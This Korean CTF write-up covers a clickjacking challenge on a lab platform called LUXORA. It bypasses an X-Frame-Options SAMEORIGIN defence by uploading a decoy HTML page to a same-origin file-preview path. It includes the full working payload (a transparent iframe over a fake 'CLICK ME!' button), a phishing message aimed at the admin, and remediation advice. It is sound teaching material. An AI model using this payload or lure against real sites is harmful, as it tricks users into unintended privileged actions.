+++
title = "VulnABLE CTF [LUXORA] Write-up: Clickjacking 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Clickjacking", "Silver", "Filter Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Clickjacking 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Client-Side Layer (Clickjacking)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/clickjack/silver`
- **목표**: 타겟 서버가 기본적인 `X-Frame-Options` 헤더를 설정하여 프레임 삽입을 막아둔 환경에서, 이 방어를 우회할 수 있는 취약한 우회 경로(Open Redirect나 중첩 프레임)를 찾아 클릭재킹을 성사시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/clickjack/silver` 페이지는 중요한 설정을 변경(예: 비밀번호 초기화 이메일 발송)하는 버튼이 있습니다.

Bronze에서 사용했던 동일한 악성 HTML을 사용하여 이 페이지를 `iframe` 에 담아 봅니다.

**[브라우저 콘솔 에러]**
```text
Refused to display 'http://localhost:3000/clickjack/silver' in a frame because it set 'X-Frame-Options' to 'SAMEORIGIN'.
```

**[해커의 사고 과정]**
1. 아, 개발자가 방어책으로 `X-Frame-Options: SAMEORIGIN` 헤더를 추가했다!
2. 내 도메인(`evil-attacker.com`)은 `localhost:3000`과 Origin(출처)이 다르므로 최신 브라우저가 화면 렌더링을 차단한다.
3. 이 헤더를 뚫기 위해서는 두 가지 방법이 있다.
   - **방법 A**: 타겟 사이트 내부에 나만의 HTML을 띄울 수 있는 곳(예: 파일 업로드 후 열람)을 찾아 그곳에서 iframe을 연다. (동일 출처로 인식됨)
   - **방법 B**: 타겟 사이트에 X-Frame-Options 헤더가 누락된 다른 페이지(예: 에러 페이지, 로그인 창)를 찾고, 그 페이지의 취약점(DOM XSS나 Open Redirect)을 연계하여 이중 프레임을 구성한다.

이번 시나리오에서는 **방법 A (타겟 사이트 내 서브도메인/경로 악용)**를 사용해 보겠습니다.

---

## 💥 2. 취약점 식별 및 우회 전략 (Exploitation)

LUXORA 플랫폼의 다른 메뉴를 탐색하던 중, 사용자가 텍스트 파일을 업로드하고 미리보기(Preview) 할 수 있는 기능(`/assets/preview?file=...`)을 발견했습니다.

이 미리보기 페이지를 조사해보니, 파일의 내용을 렌더링할 때 `X-Frame-Options` 헤더를 덧붙이지 않는 결함을 발견했습니다.

### 💡 공격 설계 (Same-Origin 우회)
1. 해커는 악성 클릭재킹 코드가 담긴 HTML 파일을 LUXORA 서버의 미리보기 기능에 업로드(혹은 주입)합니다.
2. 이 악성 HTML 파일의 주소는 `http://localhost:3000/assets/preview?file=hacker_clickjack.html` 이 됩니다.
3. 이 HTML 안에는 `<iframe src="/clickjack/silver"></iframe>` 이 들어있습니다.
4. 악성 HTML과 타겟 페이지(`/clickjack/silver`)는 **동일한 출처(localhost:3000)**를 가지므로, 브라우저는 `SAMEORIGIN` 규칙을 통과시키고 iframe을 렌더링합니다!

---

## 🚀 3. 악성 페이로드 작성 및 공격 수행

### Step 1. 악성 HTML 파일 작성
타겟 사이트에 올릴 HTML(Payload)을 작성합니다.

```html
<!-- 파일명: hacker_clickjack.html -->
<!DOCTYPE html>
<html>
<head>
    <style>
        #target_frame {
            position: absolute;
            top: 0; left: 0;
            width: 800px; height: 600px;
            opacity: 0.0001; /* 투명하게 */
            z-index: 2;
        }
        #fake_button {
            position: absolute;
            top: 300px; left: 400px;
            z-index: 1;
            padding: 20px;
            background: green;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Click here to get Admin access!</h1>
    <button id="fake_button">CLICK ME!</button>
    <!-- 경로를 상대 경로로 지정하여 Same-Origin 검사를 통과시킴 -->
    <iframe id="target_frame" src="/clickjack/silver"></iframe>
</body>
</html>
```

### Step 2. 희생자 유도
이 HTML 파일이 올라간 LUXORA 내부 링크를 관리자에게 전송합니다.
`Hey Admin, please check this system log: http://localhost:3000/assets/preview?file=hacker_clickjack.html`

### 🔍 공격 결과
관리자가 이 내부 링크를 클릭하면, 브라우저는 출처가 동일하므로 iframe 차단을 해제합니다.
관리자는 초록색 "CLICK ME!" 버튼을 누르지만, 실제로는 투명한 `/clickjack/silver` 페이지의 민감한 버튼(권한 양도 등)이 클릭됩니다.

```text
[!] System: Same-Origin Clickjacking bypass detected.
FLAG: FLAG{CLICKJACK_🥈_SAMEORIGIN_BYPASS_E4F5G6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

`X-Frame-Options` 를 `SAMEORIGIN` 으로 설정했더라도, 서버 내에 사용자가 통제할 수 있는 파일 호스팅이나 렌더링 경로가 존재한다면 동일 출처 정책(SOP)을 합법적으로 우회하여 클릭재킹을 수행할 수 있음을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{CLICKJACK_🥈_SAMEORIGIN_BYPASS_E4F5G6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 취약점은 구형 보안 헤더(`X-Frame-Options`)의 유연성 부족과 플랫폼 내 파일 처리 정책의 허점이 결합된 결과입니다.

* **안전한 패치 가이드 (CSP 도입)**
1. **Content-Security-Policy (CSP) `frame-ancestors` 사용**: 
   `X-Frame-Options`를 대체하는 최신 표준입니다. 내 사이트 내에서도, 오직 특정 경로에서만 프레임을 허용하도록 정밀하게 타겟팅할 수 있습니다.
   ```http
   Content-Security-Policy: frame-ancestors 'none'; 
   ```
   또는 자사 도메인이라도 모든 페이지에서의 무분별한 프레임 씌우기를 차단하기 위해 원칙적으로 `'none'`을 권장합니다.
2. **사용자 업로드 파일의 격리 (Sandboxing)**:
   사용자가 올린 HTML 파일을 브라우저에서 렌더링할 때는 반드시 **별도의 도메인(예: `luxora-usercontent.test`)**을 사용하거나, `Content-Disposition: attachment` 를 주어 브라우저가 화면에 그리지 못하고 강제로 다운로드하게 만들어야 Same-Origin 우회 공격을 막을 수 있습니다.